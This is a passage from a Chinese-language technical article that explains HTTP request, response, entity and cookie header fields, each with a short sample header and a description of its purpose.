&lt;p&gt;接收到附带 Range 首部字段请求的服务器，会在处理请求之后返回状态码为 206 Partial Content 的响应。无法处理该范围请求时，则会返回状态码 200 OK 的响应及全部资源。&lt;/p&gt;
&lt;h4 id=&#34;Referer&#34;&gt;&lt;a href=&#34;#Referer&#34; class=&#34;headerlink&#34; title=&#34;Referer&#34;&gt;&lt;/a&gt;Referer&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Referer&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;http://www.hackr.jp/index.htm&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;首部字段 Referer 会告知服务器请求的原始资源的 URI。&lt;/p&gt;
&lt;h4 id=&#34;TE&#34;&gt;&lt;a href=&#34;#TE&#34; class=&#34;headerlink&#34; title=&#34;TE&#34;&gt;&lt;/a&gt;TE&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;TE&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;gzip, deflate;q=0.5&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;首部字段 TE 会告知服务器客户端能够处理响应的传输编码方式及相对优先级。它和首部字段 Accept-Encoding 的功能很相像，但是用于传输编码。&lt;/p&gt;
&lt;p&gt;首部字段 TE 除指定传输编码之外，还可以指定伴随 trailer 字段的分块传输编码的方式。应用后者时，只需把 trailers 赋值给该字段值。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;TE&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;trailers&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;User-Agent&#34;&gt;&lt;a href=&#34;#User-Agent&#34; class=&#34;headerlink&#34; title=&#34;User-Agent&#34;&gt;&lt;/a&gt;User-Agent&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;User-Agent&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gec&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;首部字段 User-Agent 会将创建请求的浏览器和用户代理名称等信息传达给服务器。&lt;/p&gt;
&lt;h3 id=&#34;响应首部字段-1&#34;&gt;&lt;a href=&#34;#响应首部字段-1&#34; class=&#34;headerlink&#34; title=&#34;响应首部字段&#34;&gt;&lt;/a&gt;响应首部字段&lt;/h3&gt;&lt;p&gt;响应首部字段是由服务器端向客户端返回响应报文中所使用的字段， 用于补充响应的附加信息、服务器信息，以及对客户端的附加要求等信息。&lt;/p&gt;
&lt;h4 id=&#34;Accept-Ranges&#34;&gt;&lt;a href=&#34;#Accept-Ranges&#34; class=&#34;headerlink&#34; title=&#34;Accept-Ranges&#34;&gt;&lt;/a&gt;Accept-Ranges&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Accept-Ranges&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;bytes&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;首部字段 Accept-Ranges 是用来告知客户端服务器是否能处理范围请求，以指定获取服务器端某个部分的资源。&lt;/p&gt;
&lt;p&gt;可指定的字段值有两种，可处理范围请求时指定其为 bytes，反之则指定其为 none。&lt;/p&gt;
&lt;h4 id=&#34;Age&#34;&gt;&lt;a href=&#34;#Age&#34; class=&#34;headerlink&#34; title=&#34;Age&#34;&gt;&lt;/a&gt;Age&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Age&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;600&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;首部字段 Age 能告知客户端，源服务器在多久前创建了响应。字段值的单位为秒。&lt;/p&gt;
&lt;p&gt;若创建该响应的服务器是缓存服务器，Age 值是指缓存后的响应再次发起认证到认证完成的时间值。代理创建响应时必须加上首部字段Age。&lt;/p&gt;
&lt;h4 id=&#34;ETag&#34;&gt;&lt;a href=&#34;#ETag&#34; class=&#34;headerlink&#34; title=&#34;ETag&#34;&gt;&lt;/a&gt;ETag&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;ETag&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;&#34;82e22293907ce725faf67773957acd12&#34;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/0e9a820ce5a8a8b4b440975ba2efbed4.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;仅仅是由服务器来分配。&lt;/p&gt;
&lt;h5 id=&#34;强-ETag-值&#34;&gt;&lt;a href=&#34;#强-ETag-值&#34; class=&#34;headerlink&#34; title=&#34;强 ETag 值&#34;&gt;&lt;/a&gt;强 &lt;strong&gt;ETag&lt;/strong&gt; 值&lt;/h5&gt;&lt;p&gt;强 ETag 值，不论实体发生多么细微的变化都会改变其值。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ETag: &#34;usagi-1234&#34;&lt;/code&gt;&lt;/p&gt;
&lt;h5 id=&#34;弱-ETag-值&#34;&gt;&lt;a href=&#34;#弱-ETag-值&#34; class=&#34;headerlink&#34; title=&#34;弱 ETag 值&#34;&gt;&lt;/a&gt;弱 &lt;strong&gt;ETag&lt;/strong&gt; 值&lt;/h5&gt;&lt;p&gt;弱 ETag 值只用于提示资源是否相同。只有资源发生了根本改变，产生差异时才会改变 ETag 值。这时，会在字段值最开始处附加 W/。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ETag: W/&#34;usagi-1234&#34;&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;Location&#34;&gt;&lt;a href=&#34;#Location&#34; class=&#34;headerlink&#34; title=&#34;Location&#34;&gt;&lt;/a&gt;Location&lt;/h4&gt;&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/d427319a2e408e1a28ec464f7a19eb32.png&#34;&gt;&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Location&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;http://www.usagidesign.jp/sample.html&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;使用首部字段 Location 可以将响应接收方引导至某个与请求 URI 位置不同的资源。&lt;/p&gt;
&lt;p&gt;基本上，该字段会配合 3xx ：Redirection 的响应，提供重定向的URI。&lt;/p&gt;
&lt;h4 id=&#34;Proxy-Authenticate&#34;&gt;&lt;a href=&#34;#Proxy-Authenticate&#34; class=&#34;headerlink&#34; title=&#34;Proxy-Authenticate&#34;&gt;&lt;/a&gt;Proxy-Authenticate&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Proxy-Authenticate&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;Basic realm=&#34;Usagidesign Auth&#34;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;首部字段 Proxy-Authenticate 会把由代理服务器所要求的认证信息发送给客户端。&lt;/p&gt;
&lt;h4 id=&#34;Retry-After&#34;&gt;&lt;a href=&#34;#Retry-After&#34; class=&#34;headerlink&#34; title=&#34;Retry-After&#34;&gt;&lt;/a&gt;Retry-After&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Retry-After&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;120&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;首部字段 Retry-After 告知客户端应该在多久之后再次发送请求。主要配合状态码 503 Service Unavailable 响应，或 3xx Redirect 响应一起使用。&lt;/p&gt;
&lt;p&gt;字段值可以指定为具体的日期时间（Wed, 04 Jul 2012 06：34：24 GMT 等格式），也可以是创建响应后的秒数。&lt;/p&gt;
&lt;h4 id=&#34;Server&#34;&gt;&lt;a href=&#34;#Server&#34; class=&#34;headerlink&#34; title=&#34;Server&#34;&gt;&lt;/a&gt;Server&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Server&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;Apache/2.2.6 (Unix) PHP/5.2.5&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;首部字段 Server 告知客户端当前服务器上安装的 HTTP 服务器应用程序的信息。不单单会标出服务器上的软件应用名称，还有可能包括版本号和安装时启用的可选项。&lt;/p&gt;
&lt;h4 id=&#34;Vary&#34;&gt;&lt;a href=&#34;#Vary&#34; class=&#34;headerlink&#34; title=&#34;Vary&#34;&gt;&lt;/a&gt;Vary&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Vary&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;Accept-Language&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;从代理服务器接收到源服务器返回包含 Vary 指定项的响应之后，若再要进行缓存，仅对请求中含有相同 Vary 指定首部字段的请求返回缓存。即使对相同资源发起请求，但由于 Vary 指定的首部字段不相同，因此必须要从源服务器重新获取资源。&lt;/p&gt;
&lt;h4 id=&#34;WWW-Authenticate&#34;&gt;&lt;a href=&#34;#WWW-Authenticate&#34; class=&#34;headerlink&#34; title=&#34;WWW-Authenticate&#34;&gt;&lt;/a&gt;WWW-Authenticate&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;WWW-Authenticate&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;Basic realm=&#34;Usagidesign Auth&#34;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;首部字段 WWW-Authenticate 用于 HTTP 访问认证。它会告知客户端适用于访问请求 URI 所指定资源的认证方案（Basic 或是 Digest）和带参数提示的质询（challenge）。状态码 401 Unauthorized 响应中， 肯定带有首部字段 WWW-Authenticate。&lt;/p&gt;
&lt;h3 id=&#34;实体首部字段-1&#34;&gt;&lt;a href=&#34;#实体首部字段-1&#34; class=&#34;headerlink&#34; title=&#34;实体首部字段&#34;&gt;&lt;/a&gt;实体首部字段&lt;/h3&gt;&lt;p&gt;实体首部字段是包含在请求报文和响应报文中的实体部分所使用的首部，用于补充内容的更新时间等与实体相关的信息。&lt;/p&gt;
&lt;h4 id=&#34;Alow&#34;&gt;&lt;a href=&#34;#Alow&#34; class=&#34;headerlink&#34; title=&#34;Alow&#34;&gt;&lt;/a&gt;Alow&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Allow&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;GET, HEAD&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;首部字段 Allow 用于通知客户端能够支持 Request-URI 指定资源的所有 HTTP 方法。当服务器接收到不支持的 HTTP 方法时，会以状态码405 Method Not Allowed 作为响应返回。与此同时，还会把所有能支持的 HTTP 方法写入首部字段 Allow 后返回。&lt;/p&gt;
&lt;h4 id=&#34;Content-Encoding&#34;&gt;&lt;a href=&#34;#Content-Encoding&#34; class=&#34;headerlink&#34; title=&#34;Content-Encoding&#34;&gt;&lt;/a&gt;Content-Encoding&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Content-Encoding&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;gzip&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;首部字段 Content-Encoding 会告知客户端服务器对实体的主体部分选用的内容编码方式。内容编码是指在不丢失实体信息的前提下所进行的压缩。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;gzip&lt;/li&gt;
&lt;li&gt;compress&lt;/li&gt;
&lt;li&gt;deflate&lt;/li&gt;
&lt;li&gt;identity&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;Content-Languag&#34;&gt;&lt;a href=&#34;#Content-Languag&#34; class=&#34;headerlink&#34; title=&#34;Content-Languag&#34;&gt;&lt;/a&gt;Content-Languag&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Content-Language&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;zh-CN&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;首部字段 Content-Language 会告知客户端，实体主体使用的自然语言（指中文或英文等语言）。&lt;/p&gt;
&lt;h4 id=&#34;Content-Length&#34;&gt;&lt;a href=&#34;#Content-Length&#34; class=&#34;headerlink&#34; title=&#34;Content-Length&#34;&gt;&lt;/a&gt;Content-Length&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Content-Length&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;15000&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;首部字段 Content-Length 表明了实体主体的大小（单位是字节）。对实体主体进行内容编码传输时，不能再使用 Content-Length 首部字段。&lt;/p&gt;
&lt;h4 id=&#34;Content-Location&#34;&gt;&lt;a href=&#34;#Content-Location&#34; class=&#34;headerlink&#34; title=&#34;Content-Location&#34;&gt;&lt;/a&gt;Content-Location&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Content-Location&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;http://www.hackr.jp/index-ja.html&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;首部字段 Content-Location 给出与报文主体部分相对应的 URI。和首部字段Location 不同，Content-Location 表示的是报文主体返回资源对应的 URI。&lt;/p&gt;
&lt;p&gt;比如，对于使用首部字段 Accept-Language 的服务器驱动型请求，当返回的页面内容与实际请求的对象不同时，首部字段 Content-Location 内会写明 URI。&lt;/p&gt;
&lt;h4 id=&#34;Content-MD5&#34;&gt;&lt;a href=&#34;#Content-MD5&#34; class=&#34;headerlink&#34; title=&#34;Content-MD5&#34;&gt;&lt;/a&gt;Content-MD5&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Content-MD5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;OGFkZDUwNGVhNGY3N2MxMDIwZmQ4NTBmY2IyTY==&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/cae670c7d7ca3bf6ff620ed7cf4fafe2.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;首部字段 Content-MD5 是一串由 MD5 算法生成的值，其目的在于检查报文主体在传输过程中是否保持完整，以及确认传输到达。&lt;/p&gt;
&lt;p&gt;对报文主体执行 MD5 算法获得的 128 位二进制数，再通过 Base64 编码后将结果写入 Content-MD5 字段值。由于 HTTP 首部无法记录二进制值，所以要通过 Base64 编码处理。为确保报文的有效性，作为接收方的客户端会对报文主体再执行一次相同的 MD5 算法。计算出的值与字段值作比较后，即可判断出报文主体的准确性。&lt;/p&gt;
&lt;h4 id=&#34;Content-Range&#34;&gt;&lt;a href=&#34;#Content-Range&#34; class=&#34;headerlink&#34; title=&#34;Content-Range&#34;&gt;&lt;/a&gt;Content-Range&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Content-Range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;bytes 5001-10000/10000&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;针对范围请求，返回响应时使用的首部字段 Content-Range，能告知客户端作为响应返回的实体的哪个部分符合范围请求。字段值以字节为单位，表示当前发送部分及整个实体大小。&lt;/p&gt;
&lt;h4 id=&#34;Content-Type&#34;&gt;&lt;a href=&#34;#Content-Type&#34; class=&#34;headerlink&#34; title=&#34;Content-Type&#34;&gt;&lt;/a&gt;Content-Type&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Content-Type&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;text/html; charset=UTF-8&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;首部字段 Content-Type 说明了实体主体内对象的媒体类型。和首部字段 Accept 一样，字段值用 type/subtype 形式赋值。&lt;/p&gt;
&lt;h4 id=&#34;Expires&#34;&gt;&lt;a href=&#34;#Expires&#34; class=&#34;headerlink&#34; title=&#34;Expires&#34;&gt;&lt;/a&gt;Expires&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Expires&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;Wed, 04 Jul 2012 08:26:05 GMT&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;首部字段 Expires 会将资源失效的日期告知客户端。缓存服务器在接收到含有首部字段 Expires 的响应后，会以缓存来应答请求，在Expires 字段值指定的时间之前，响应的副本会一直被保存。当超过指定的时间后，缓存服务器在请求发送过来时，会转向源服务器请求资源。&lt;/p&gt;
&lt;p&gt;当首部字段 Cache-Control 有指定 max-age 指令时，比起首部字段 Expires，会优先处理 max-age 指令。&lt;/p&gt;
&lt;h4 id=&#34;Last-Modified&#34;&gt;&lt;a href=&#34;#Last-Modified&#34; class=&#34;headerlink&#34; title=&#34;Last-Modified&#34;&gt;&lt;/a&gt;Last-Modified&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Last-Modified&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;Wed, 23 May 2012 09:59:55 GMT&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;首部字段 Last-Modified 指明资源最终修改的时间。一般来说，这个值就是 Request-URI 指定资源被修改的时间。但类似使用 CGI 脚本进行动态数据处理时，该值有可能会变成数据最终修改时的时间。&lt;/p&gt;
&lt;h3 id=&#34;为-Cookie-服务的首部字段&#34;&gt;&lt;a href=&#34;#为-Cookie-服务的首部字段&#34; class=&#34;headerlink&#34; title=&#34;为 Cookie 服务的首部字段&#34;&gt;&lt;/a&gt;为 &lt;strong&gt;Cookie&lt;/strong&gt; 服务的首部字段&lt;/h3&gt;&lt;p&gt;Cookie 的工作机制是用户识别及状态管理。Web 网站为了管理用户的状态会通过 Web 浏览器，把一些数据临时写入用户的计算机内。接着当用户访问该Web网站时，可通过通信方式取回之前发放的Cookie。&lt;/p&gt;
&lt;p&gt;调用 Cookie 时，由于可校验 Cookie 的有效期，以及发送方的域、路径、协议等信息，所以正规发布的 Cookie 内的数据不会因来自其他Web 站点和攻击者的攻击而泄露。&lt;/p&gt;
&lt;h4 id=&#34;Cookie-的规格标准文档&#34;&gt;&lt;a href=&#34;#Cookie-的规格标准文档&#34; class=&#34;headerlink&#34; title=&#34;Cookie 的规格标准文档&#34;&gt;&lt;/a&gt;Cookie 的规格标准文档&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;h6 id=&#34;RFC2109&#34;&gt;&lt;a href=&#34;#RFC2109&#34; class=&#34;headerlink&#34; title=&#34;RFC2109&#34;&gt;&lt;/a&gt;RFC2109&lt;/h6&gt;&lt;/li&gt;
&lt;li&gt;&lt;h6 id=&#34;RFC2965&#34;&gt;&lt;a href=&#34;#RFC2965&#34; class=&#34;headerlink&#34; title=&#34;RFC2965&#34;&gt;&lt;/a&gt;RFC2965&lt;/h6&gt;&lt;/li&gt;
&lt;li&gt;&lt;h6 id=&#34;RFC6265&#34;&gt;&lt;a href=&#34;#RFC6265&#34; class=&#34;headerlink&#34; title=&#34;RFC6265&#34;&gt;&lt;/a&gt;RFC6265&lt;/h6&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;由网景公司颁布的规格标准&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;Cookie-服务的首部字段&#34;&gt;&lt;a href=&#34;#Cookie-服务的首部字段&#34; class=&#34;headerlink&#34; title=&#34;Cookie 服务的首部字段&#34;&gt;&lt;/a&gt;&lt;strong&gt;Cookie&lt;/strong&gt; 服务的首部字段&lt;/h4&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;首部字段名&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;th&gt;首部类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;Set-Cookie&lt;/td&gt;
&lt;td&gt;开始状态管理所使用的Cookie信息&lt;/td&gt;
&lt;td&gt;响应首部字段&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Cookie&lt;/td&gt;
&lt;td&gt;服务器接收到的Cookie信息&lt;/td&gt;
&lt;td&gt;请求首部字段&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
